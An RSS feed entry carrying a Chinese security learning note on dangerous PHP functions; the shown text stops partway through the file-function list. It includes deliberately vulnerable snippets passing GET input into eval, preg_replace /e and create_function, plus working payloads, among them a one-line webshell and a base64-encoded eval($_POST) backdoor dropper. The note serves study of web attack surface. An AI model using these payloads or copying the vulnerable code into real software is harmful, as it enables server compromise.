<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Go Forward • Posts by &#34;php危险函数&#34; tag</title>
        <link>https://chungod.github.io</link>
        <description>欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷</description>
        <language>zh-CN</language>
        <pubDate>Tue, 04 May 2021 12:34:41 +0800</pubDate>
        <lastBuildDate>Tue, 04 May 2021 12:34:41 +0800</lastBuildDate>
        <category>Linux反弹shell多种姿态</category>
        <category>Linux提权</category>
        <category>Windows内核提权</category>
        <category>paramiko模块介绍</category>
        <category>php危险函数</category>
        <category>内存取证</category>
        <category>meterpreter学习笔记</category>
        <category>溯源取证总结</category>
        <category>upload-labs通关记录</category>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</guid>
            <title>php危险函数</title>
            <link>https://chungod.github.io/2021/05/04/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</link>
            <category>php危险函数</category>
            <pubDate>Tue, 04 May 2021 12:34:41 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;php常见危险函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php常见危险函数&#34;&gt;#&lt;/a&gt; PHP 常见危险函数&lt;/h2&gt;
&lt;h3 id=&#34;eval函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval函数&#34;&gt;#&lt;/a&gt; eval () 函数&lt;/h3&gt;
&lt;p&gt;定义和用法：&lt;/p&gt;
&lt;p&gt;eval () 函数把字符串按照 PHP 代码来计算.&lt;br&gt;
 该字符串必须是合法的 PHP 代码，且必须以分号结尾。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;var&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$arg&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\$var = &lt;span class=&#34;subst&#34;&gt;$arg&lt;/span&gt;;&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;\$var =&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503102521525.png&#34; alt=&#34;image-20210503102521525&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503102807857.png&#34; alt=&#34;image-20210503102807857&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;assert函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#assert函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;assert () 函数&lt;/strong&gt;&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;assert()会检查指定的assertion并在结果为FALSE时采取适当的行动。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断一个表达式是否成立。返回true or false。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一般情况下，黑名单都会禁用 &lt;code&gt;eval()&lt;/code&gt;  函数，所以用 &lt;code&gt;assert&lt;/code&gt;  来代替 eval 来执行具体操作。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503103001094.png&#34; alt=&#34;image-20210503103001094&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;assertion函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#assertion函数&#34;&gt;#&lt;/a&gt; assertion 函数&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;检查一个断言是否为 FALSE。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php $_GET[a]($_GET[b]);?&amp;gt;  //一句话木马&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//payload： ?a=assert&amp;amp;b=&amp;#123;fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwJF9QT1NUW2NdKTsgPz4))&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;preg_replace函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#preg_replace函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;preg_replace () 函数&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;preg_replace 函数执行一个正则表达式的搜索和替换。&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[pat];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[rep];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[sub];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt;) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		preg_replace(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$replacement&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$subject&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?pat=/test/e&amp;amp;rep=phpinfo()&amp;amp;sub=jutst test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;也可以为&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?pat=/test/e&amp;amp;rep=var_dump(`net user`)&amp;amp;sub=jutst test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;create_function函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create_function函数&#34;&gt;#&lt;/a&gt; create_function () 函数&lt;/h3&gt;
&lt;p&gt;string create_function ( string $args , string $code )&lt;br&gt;
 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;sort_by&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sorter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;strnatcasecmp&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$databases&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1234&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;4321&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$sort_function&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27; return 1 * &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sorter&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;($a[&amp;quot;&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;], $b[&amp;quot;&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$sort_by&lt;/span&gt; . &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;quot;]);&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;usort(&lt;span class=&#34;variable&#34;&gt;$databases&lt;/span&gt;, create_function(&lt;span class=&#34;string&#34;&gt;&amp;#x27;$a, $b&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$sort_function&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造匿名函数原型&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; * &lt;span class=&#34;string&#34;&gt;&amp;#x27; . $sorter . &amp;#x27;&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; . &lt;span class=&#34;subst&#34;&gt;$sort_by&lt;/span&gt; . &amp;#x27;&amp;quot;&lt;/span&gt;], &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; . &lt;span class=&#34;subst&#34;&gt;$sort_by&lt;/span&gt; . &amp;#x27;&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造 payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/test3.php?sort_by=%27%22]);&amp;#125;phpinfo();/*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503104641807.png&#34; alt=&#34;image-20210503104641807&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;call_user_func函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#call_user_func函数&#34;&gt;#&lt;/a&gt; call_user_func 函数&lt;/h3&gt;
&lt;p&gt;mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )&lt;br&gt;
 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。&lt;/p&gt;
&lt;p&gt;代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;= &lt;span class=&#34;string&#34;&gt;&amp;#x27;assert&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo()&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    call_user_func(&lt;span class=&#34;variable&#34;&gt;$filter&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210503111406856.png&#34; alt=&#34;image-20210503111406856&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;call_user_func_array函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#call_user_func_array函数&#34;&gt;#&lt;/a&gt; call_user_func_array 函数&lt;/h3&gt;
&lt;p&gt;call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;命令执行函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#命令执行函数&#34;&gt;#&lt;/a&gt; 命令执行函数&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;exec ()  执行一个外部程序&lt;/li&gt;
&lt;li&gt;passthru ()  执行外部程序并且显示原始输出&lt;/li&gt;
&lt;li&gt;proc_open ()  执行一个命令，并且打开用来输入 / 输出的文件指针&lt;/li&gt;
&lt;li&gt;shell_exec ()  通过 shell 环境执行命令，将完整的输出以字符串方式返回&lt;/li&gt;
&lt;li&gt;system ()  执行外部程序，并且显示输出&lt;/li&gt;
&lt;li&gt;popen ()  通过 popen () 的参数传递一条命令，并对 popen () 所打开的文件进行执行&lt;/li&gt;
&lt;li&gt;escapeshellcmd () 对字符串中可能会欺骗 shell 命令执行任意命令的字符转义&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;包含函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#包含函数&#34;&gt;#&lt;/a&gt; 包含函数&lt;/h2&gt;
&lt;p&gt;require、include、require_once、include_once&lt;br&gt;
 包含函数 一共有四个，主要作用为包含并运行指定文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 (E_COMPILE_ERROR) 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。&lt;/li&gt;
&lt;li&gt;include 语句包含并运行指定文件&lt;/li&gt;
&lt;li&gt;require_once 语句和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;include_once&lt;/em&gt; 语句在脚本执行期间包含并运行指定文件。此行为和 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmluY2x1ZGUucGhw&#34;&gt;include&lt;/span&gt; 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件操作函数官方文档&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件操作函数官方文档&#34;&gt;#&lt;/a&gt; 文件操作函数 (官方文档)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;copy  拷贝文件 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmNvcHkucGhw&#34;&gt;http://php.net/manual/zh/function.copy.php&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;file_get_contents  将整个文件读入一个字符串 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==&#34;&gt;http://php.net/manual/zh/function.file-get-contents.php&lt;/span&gt;&lt;/li&gt;
